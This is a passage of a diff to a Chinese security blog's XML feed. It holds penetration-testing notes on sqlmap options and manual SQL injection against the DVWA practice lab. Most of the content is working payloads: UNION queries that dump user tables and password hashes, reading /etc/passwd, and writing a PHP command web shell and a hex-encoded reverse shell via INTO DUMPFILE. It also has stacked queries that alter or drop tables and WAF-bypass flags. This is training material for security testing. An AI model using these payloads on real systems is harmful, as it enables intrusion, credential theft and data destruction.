sqlmap -z &quot;ign,flu,bat,tec=U,dump,D=testdb,T=users&quot; -u “1.1.1.1/ vuln.php?id=1&quot;--answer    sqlmap -u &quot;http://1.1.1.1/a.php?id=1&quot; --technique=E --answers=&quot;extending=N&quot; --batch--check-waf        #检测WAF/IPS/IDS--hpp            #HTTP parameter pollution    绕过WAF/IPS/IDS的有效方法    尤其对ASP/IIS和ASP.NET/IIS--identify-waf    #彻底的waf/ips/ids检查    支持30多种产品--mobile        #模拟智能手机设备--purge-output    #清除output文件夹--smart            #当有大量检测目标时,只选择基于错误的检测结果--wizard        #向导</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;blockquote&gt;
-&lt;h4 id=&quot;SQLMAP自动注入&quot;&gt;&lt;a href=&quot;#SQLMAP自动注入&quot; class=&quot;headerlink&quot; title=&quot;SQLMAP自动注入&quot;&gt;&lt;/a&gt;&lt;strong&gt;SQLMAP自动注入&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;开源sql注入漏
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="Web渗透" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/"/>
-    
-      <category term="SQL注入" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-    
-      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
-    
-      <category term="SQL注入" scheme="http://c.cat.plus/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-      <category term="sqlmap" scheme="http://c.cat.plus/tags/sqlmap/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>手动SQL注入</title>
-    <link href="http://c.cat.plus/2014/05/04/Web_Attacks/SQL%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/"/>
-    <id>http://c.cat.plus/2014/05/04/Web_Attacks/SQL%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/</id>
-    <published>2014-05-04T08:23:17.000Z</published>
-    <updated>2020-05-28T03:13:37.185Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><h3 id="手动漏洞挖掘–SQL注入"><a href="#手动漏洞挖掘–SQL注入" class="headerlink" title="手动漏洞挖掘–SQL注入"></a><strong>手动漏洞挖掘–SQL注入</strong></h3></blockquote><ul><li>服务器端程序将用户输入参数作为查询条件,直接拼接SQL语句,并将查询结果返回给客户端浏览器</li></ul><h5 id="用户登录判断"><a href="#用户登录判断" class="headerlink" title="用户登录判断"></a><strong>用户登录判断</strong></h5><pre><code>SELECT * FROM users WHERE user=&apos;uname&apos; AND password=&apos;pass&apos; SELECT * FROM users WHERE user=&apos;name&apos; AND password=&quot; OR &quot;=&apos;&apos; </code></pre><h5 id="基于报错的检测方法-low"><a href="#基于报错的检测方法-low" class="headerlink" title="基于报错的检测方法(low)"></a><strong>基于报错的检测方法(low)</strong></h5><pre><code>&apos; &apos;&apos; % ()</code></pre><h5 id="基于布尔的检测"><a href="#基于布尔的检测" class="headerlink" title="基于布尔的检测"></a><strong>基于布尔的检测</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and &#39;1&#39;&#x3D;1&#39;&#x2F;1&#39; and &#39;1</span><br><span class="line">1&#39; and &#39;1&#39;&#x3D;&#39;2&#x2F;1&#39; and &#39;0</span><br><span class="line">表列数&#x2F;显示信息位于哪一列</span><br><span class="line">&#39; order by 9-- +#按查询列号排序(注释符:--)</span><br><span class="line">select *#时表字段数&#x3D;查询字段数\</span><br></pre></td></tr></table></figure><h5 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a><strong>联合查询</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select 1,2-- +</span><br><span class="line">&#39; union all select database(),2-- +</span><br><span class="line">&#39; union select database(),substring_index(USER(),&quot;@&quot;,1)-- </span><br><span class="line">DB用户:user()</span><br><span class="line">DB版本:version()</span><br><span class="line">全局函数:@@datadir, @@hostname, @@VERSION, @@version_compile_os</span><br><span class="line">当前库:database()</span><br><span class="line">ASCLL转字符:CHAR()</span><br><span class="line">连接字符串:CONCAT_WS(CHAR(32,58,32),user(),database(),version())</span><br><span class="line">计算哈希:md5()</span><br><span class="line">Mysql数据结构</span><br><span class="line">information_schema</span><br><span class="line"></span><br><span class="line">所有库所有表&#x2F;统计每库中表的数量</span><br><span class="line">&#39; union select table_name,table_schema from information_schema.tables--+#查询所有库和表</span><br><span class="line">&#39; UNION select table_schema,count(*) FROM information_Schema.tables group by table_schema --+#查询所有库并统计表的数量</span><br><span class="line"> DVWA库中的表名</span><br><span class="line">&#39; union select table_name,table_schema from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;--+#查询DVWA库中的表名</span><br><span class="line">users表中的所有列(user_id,first_name,first_name,last_name,user,password,avatar)</span><br><span class="line">&#39; union select table_name,column_name from information_schema.columns where table_schema&#x3D;&#39;dvwa&#39; and table_name&#x3D;&#39;users&#39;--+#查询表名中的列</span><br><span class="line">查询user,password列的内容</span><br><span class="line">&#39; union select user,password from dvwa.users--+</span><br><span class="line">&#39; union select user,password from users--+</span><br><span class="line">&#39; union select null, concat(user,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><p><strong>密码破解</strong></p><pre><code>username:passhash------&gt;dvwa.txtjohn --format=raw-MD5 dvwa.txt</code></pre><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a><strong>读取文件</strong></h4><pre><code>&apos; union SELECT null, load_file(&apos;/etc/passwd&apos;)--+</code></pre><h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a><strong>写入文件</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select null,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot; INTO DUMPFILE &quot;&#x2F;var&#x2F; www&#x2F;a.php&quot; --+</span><br><span class="line">Mysql账号</span><br><span class="line">cat php-revers-shell.php | xxd -ps | tr -d &#39;\n&#39;#查看文件二进制数据并输出16进制数据,删除换行</span><br><span class="line">cat php-revers-shell.php | xxd -ps | tr -d &#39;\n&#39;</span><br><span class="line">&#39; union select null, (0x3c3f706870) INTO DUMPFILE &#39;&#x2F;tmp&#x2F;x.php&#39;-- #通过16进制数据在缓存文件夹写入shell</span><br></pre></td></tr></table></figure><h4 id="保存下载数据库"><a href="#保存下载数据库" class="headerlink" title="保存下载数据库"></a><strong>保存下载数据库</strong></h4><pre><code>&apos; union select null, concat(user,0x3a,password) from users INTO OUTFILE &apos;/ tmp/a.db&apos;-- </code></pre><p>新思路:编写服务端代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select null, &#39;&lt;?php if(isset($_POST[&quot;submit&quot;])) &#123; $userID &#x3D; $_POST[&quot;userID&quot;]; $first_name &#x3D; $_POST[&quot;first_name&quot;]; $last_name &#x3D; $_POST[&quot;last_name&quot;]; $username &#x3D; $_POST[&quot;username&quot;]; $avatar &#x3D; $_POST[&quot;avatar&quot;]; echo &quot;userID: $userID&lt;BR&gt;&quot;; echo &quot;first_name: $first_name&lt;BR&gt;&quot;; echo &quot;last_name: $last_name&lt;BR&gt;&quot;; echo &quot;username: $username&lt;BR&gt;&quot;; echo &quot;avatar: $avatar&lt;BR&gt;&quot;; $con&#x3D;mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;&quot;,&quot;dvwa&quot;); if (mysqli_connect_errno()) &#123; echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); &#125; else &#123; echo &quot;Connected to database&lt;BR&gt;&quot;; &#125; $password &#x3D; &quot;123&quot;; $sql&#x3D;&quot;insert into dvwa.users values (\\&quot;$userID\\&quot;,\ \&quot;$first_name\\&quot;,\\&quot;$last_name\\&quot;,\\&quot;$username\\&quot;,MD5(\\&quot;$password\\&quot;),\\&quot;$avatar\ \&quot;)&quot;; if (mysqli_query($con,$sql)) &#123; echo &quot;[Successful Insertion]: $sql&quot;; &#125; else &#123; echo &quot;Error creating database: &quot; . mysqli_error($con); &#125; mysqli_close($con); &#125; ?&gt; &lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;]; ?&gt;&quot;&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;userID&quot; value&#x3D;&quot;33&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;first_name&quot; value&#x3D;&quot;fh&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;last_name&quot; value&#x3D;&quot;y&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;yfh&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;avatar&quot; value&#x3D;&quot;yfh!&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit Form&quot;&gt;&lt;br&gt; &lt;&#x2F;form&gt;&#39; INTO DUMPFILE &#39;&#x2F;tmp&#x2F;user.php&#39; --</span><br></pre></td></tr></table></figure><h4 id="无权读取information-schema库-拒绝union-order-by语句"><a href="#无权读取information-schema库-拒绝union-order-by语句" class="headerlink" title="无权读取information_schema库/拒绝union,order by语句"></a><strong>无权读取information_schema库/拒绝union,order by语句</strong></h4><pre><code>猜列名: &apos; and column is null--+    Burp suite 自动猜列名    find / -name *column*.txt        #寻找字典路径猜当前表表名: &apos; and table.user is null--+猜库里其它表: &apos; and (select dvwa from table)&gt;0--+列表对应关系: &apos; and users.user is null--+猜字段内容:    &apos; or user=&apos;admin            &apos; or user like &apos;%a%猜账号对应密码:    &apos; or user=&apos;admin&apos; and password=&apos;5f4dcc3b5aa765d61d8327deb882cf99</code></pre><h4 id="当数据库可写"><a href="#当数据库可写" class="headerlink" title="当数据库可写"></a><strong>当数据库可写</strong></h4><pre><code>&apos;; update users set user=&apos;yuanfh&apos; where user=&apos;admin    注入失败,sql客户端工具的问题    http://dev.mysql.com/doc/refman/5.7/en/commands-out-of-sync.html&apos;; INSERT INTO users (&apos; user_id&apos;,&apos; first_name&apos;,&apos; last_name&apos;,&apos; user&apos;,&apos;password&apos;,&apos;avatar&apos;) VALUES (‘35&apos;,‘fh&apos;,‘yuan&apos;,‘yfh&apos;,&apos;5f4dcc3b5aa765d61d8327deb882cf99&apos;,&apos;OK&apos;);--+ &apos;; DROP TABLE users; -- xp_cmdshell / 存储过程</code></pre><ul><li>SQLi没有通用的方法,掌握原理,了解各种数据库特性</li></ul><p>Medium难度级别</p><pre><code>mysql_real_escape_string()    PHP 4 &gt;= 4.3.0, PHP5PHP 5.5.5.0 已经弃用此函数PHP 7.0.0 已经删除此函数,代之以 MySQLi,PDO_MySQL 转义符,对下列字符转义\x00,\n,\r,\,&apos;,&quot;,\x1a</code></pre><p>high难度级别</p><pre><code>mysql_real_escape_string()stripslashes()    去除&quot;\&quot;is_numeric()    判断是否是数字</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;blockquote&gt;
-&lt;h3 id=&quot;手动漏洞挖掘–SQL注入&quot;&gt;&lt;a href=&quot;#手动漏洞挖掘–SQL注入&quot; class=&quot;headerlink&quot; title=&quot;手动漏洞挖掘–SQL注入&quot;&gt;&lt;/a&gt;&lt;strong&gt;手动漏洞挖掘–SQL注入&lt;/strong&gt;&lt;/h3&gt;&lt;/b
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="Web渗透" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/"/>
-    
-      <category term="SQL注入" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-    
-      <category term="SQL注入" scheme="http://c.cat.plus/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-      <category term="Burpsuit" scheme="http://c.cat.plus/tags/Burpsuit/"/>
-    
-      <category term="联合查询" scheme="http://c.cat.plus/tags/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/"/>
     
   </entry>
   
